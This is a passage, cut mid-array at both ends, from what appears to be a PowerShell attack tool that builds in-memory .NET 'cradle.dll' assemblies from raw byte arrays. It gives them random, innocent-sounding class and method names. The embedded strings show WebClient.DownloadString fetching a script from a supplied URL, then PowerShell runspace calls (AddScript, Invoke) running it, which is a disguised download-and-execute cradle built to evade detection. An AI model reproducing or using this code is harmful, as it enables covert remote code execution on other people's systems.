0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledRandom  += , @('lvLcG'         , 'eFbQLwd'           , @("$CompiledHeader`35,53,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(36,35,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,172,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,208,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,72,2,0,0,8,0,0,0,35,85,83,0,80,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,96,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,96,0,64,0,6,0,128,0,64,0,10,0,180,0,169,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,58,0,15,0,2,0,0,0,1,0,165,0,17,0,58,0,19,0,25,0,58,0,15,0,33,0,58,0,15,0,33,0,190,0,24,0,9,0,58,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(158,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,108,118,76,99,71,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,101,70,98,81,76,119,100,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,0,3,32,0,0,0,0,0,88,30,60,187,48,3,96,70,180,6,207,203,68,110,71,190,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,76,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`45,53,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(156,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,0,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,164,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,116,3,0,0,8,0,0,0,35,85,83,0,124,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,140,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,100,0,68,0,6,0,132,0,68,0,10,0,237,0,198,0,10,0,253,0,198,0,10,0,26,1,169,0,14,0,68,1,57,1,6,0,134,1,103,1,10,0,147,1,169,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,146,32,0,0,0,0,134,24,58,0,15,0,2,0,0,0,1,0,64,0,17,0,58,0,19,0,25,0,58,0,15,0,33,0,6,1,33,0,41,0,21,1,15,0,49,0,37,1,38,0,49,0,44,1,43,0,57,0,58,0,15,0,57,0,78,1,49,0,49,0,93,1,54,0,49,0,156,1,60,0,9,0,58,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(162,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(24,0,169,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,108,118,76,99,71,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,101,70,98,81,76,119,100,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,32,0,0,0,0,0,168,153,196,146,248,28,34,78,162,141,176,125,53,209,71,1,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,196,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`59,53,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(224,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,56,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,196,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,164,3,0,0,8,0,0,0,35,85,83,0,172,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,188,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,118,0,86,0,6,0,150,0,86,0,10,0,255,0,216,0,10,0,15,1,216,0,10,0,44,1,187,0,14,0,86,1,75,1,6,0,111,1,36,0,6,0,166,1,135,1,10,0,179,1,187,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,157,32,0,0,0,0,134,24,58,0,16,0,3,0,0,0,1,0,64,0,0,0,2,0,68,0,17,0,58,0,20,0,25,0,58,0,16,0,33,0,24,1,34,0,41,0,39,1,16,0,49,0,55,1,39,0,49,0,62,1,44,0,57,0,58,0,16,0,57,0,96,1,50,0,65,0,118,1,55,0,49,0,125,1,62,0,49,0,188,1,68,0,9,0,58,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(180,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(25,0,187,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,108,118,76,99,71,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,101,70,98,81,76,119,100,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,59,0,0,0,0,0,96,60,103,157,120,39,179,66,136,227,166,133,70,34,140,243,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,8,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledRandom  += , @('qjnufyTD'      , 'KUQHaRC'           , @("$CompiledHeader`185,38,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(36,35,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,172,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,208,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,72,2,0,0,8,0,0,0,35,85,83,0,80,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,96,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,99,0,67,0,6,0,131,0,67,0,10,0,183,0,172,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,109,32,0,0,0,0,134,24,61,0,15,0,2,0,0,0,1,0,168,0,17,0,61,0,19,0,25,0,61,0,15,0,33,0,61,0,15,0,33,0,193,0,24,0,9,0,61,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(161,0,0,0,2)+@(0)*11+@(1,0,30,0,0,0,0,0,2)+@(0)*11+@(1,0,39)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,113,106,110,117,102,121,84,68,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,75,85,81,72,97,82,67,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,210,235,137,190,31,244,154,73,178,211,103,11,28,197,205,205,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,76,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,